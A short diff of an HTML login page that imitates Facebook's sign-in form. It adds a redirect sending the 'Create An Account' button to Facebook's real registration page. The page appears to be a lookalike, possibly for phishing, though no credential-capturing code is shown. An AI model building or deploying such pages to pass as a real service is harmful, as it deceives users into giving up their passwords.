@@ -19,14 +19,14 @@
         <label>Password</label><br>
         <input class="villan" type="password" name="pass" autocomplete="on" autofocus="on" required>
         <br>
-        <input type="submit" id="btn" class="btn"value="Log In"></form>
+        <input type="submit" id="btn" class="btn" value="Log In" /></form>
         
         <br>
         <a href="https://www.facebook.com/login/identify">Forgotten password?</a>
         <br>
         <p class="hero"> ────────── or ─────────── </p>
         
-        <input type="submit" class="int" value="Create An Account">
+        <input onclick="showchange()" type="submit" class="int" value="Create An Account">
   
   <div id="invincible">
     <br>&nbsp;
@@ -36,7 +36,9 @@
     <br><br>
     </div>
     <script>
-          
+          function showchange(){
+                window.location.href = 'https://www.facebook.com/reg/';
+          }
     </script>
 </body>
 </html>
